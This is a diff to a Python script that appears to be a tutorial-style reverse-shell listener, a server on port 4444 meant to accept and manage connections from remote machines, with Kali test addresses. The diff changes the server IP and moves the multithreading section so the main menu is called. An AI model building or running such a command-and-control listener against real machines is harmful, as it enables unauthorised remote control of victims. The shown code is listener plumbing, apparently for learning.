@@ -29,7 +29,8 @@ arrAddresses = []  # Store All Socket Connection Addresses
 arrConnections = []  # Store All Connection Information about Socket Connections
 
 # TODO: for testing change SERVER_HOST to Kali WSL IP Address
-SERVER_HOST = "192.168.10.100"  # Server IP Address
+# SERVER_HOST = "192.168.10.100"  # Server IP Address
+SERVER_HOST = "172.29.132.195"  # Kali WSL IP Address, Server for testing
 SERVER_PORT = 4444  # Server Port
 
 intBuffer = 1024  # Maximum Size(Bytes) of Data to Receive as
@@ -116,56 +117,6 @@ def socket_accept():
             continue
 
 
-
-""" Section 2: Implement Multithreading """
-
-# Step 8: Define the Main Job Function, which use as a Thread in Multithreading
-def work():
-    while True:
-        intValue = queue.get()
-
-        if intValue == 1:
-            create_socket()
-            socket_bind()
-            socket_accept()
-
-        elif intValue == 2:
-            while True:
-                sleep(20)
-
-                if len(arrAddresses) > 0:
-                    # Write main_menu() in next steps
-                    # main_menu()
-                    break
-
-        queue.task_done()
-        queue.task_done()
-        exit(0)
-
-
-# Step 9: Define a Function to Create Threads and run work() Multithreading
-def create_threads():
-    for _ in range(intThreads):
-        objThread = Thread(target=work)
-        objThread.daemon = True
-        objThread.start()
-
-    queue.join()
-
-
-# Step 10: Define a Function to Create Jobs
-def create_jobs():
-    for intThreads in arrJobs:
-        queue.put(intThreads)
-
-    queue.join()
-
-
-# Step 11: Call Function's to Run the app on Multithreading
-create_threads()
-create_jobs()
-
-
 # Step 12: Define a Function to Show Help Menu
 def menu_help():
     print("""\n
@@ -233,6 +184,56 @@ def list_connections():
     else:
         print("[-] No Connections Found!!.")
 
+
+
+
+""" Section 2: Implement Multithreading """
+
+# Step 8: Define the Main Job Function, which use as a Thread in Multithreading
+def work():
+    while True:
+        intValue = queue.get()
+
+        if intValue == 1:
+            create_socket()
+            socket_bind()
+            socket_accept()
+
+        elif intValue == 2:
+            while True:
+                sleep(20)
+
+                if len(arrAddresses) > 0:
+                    # Write main_menu() in next steps
+                    main_menu()
+                    break
+
+        queue.task_done()
+        queue.task_done()
+        exit(0)
+
+
+# Step 9: Define a Function to Create Threads and run work() Multithreading
+def create_threads():
+    for _ in range(intThreads):
+        objThread = Thread(target=work)
+        objThread.daemon = True
+        objThread.start()
+
+    queue.join()
+
+
+# Step 10: Define a Function to Create Jobs
+def create_jobs():
+    for intThreads in arrJobs:
+        queue.put(intThreads)
+
+    queue.join()
+
+
+# Step 11: Call Function's to Run the app on Multithreading
+create_threads()
+create_jobs()
 
 
 
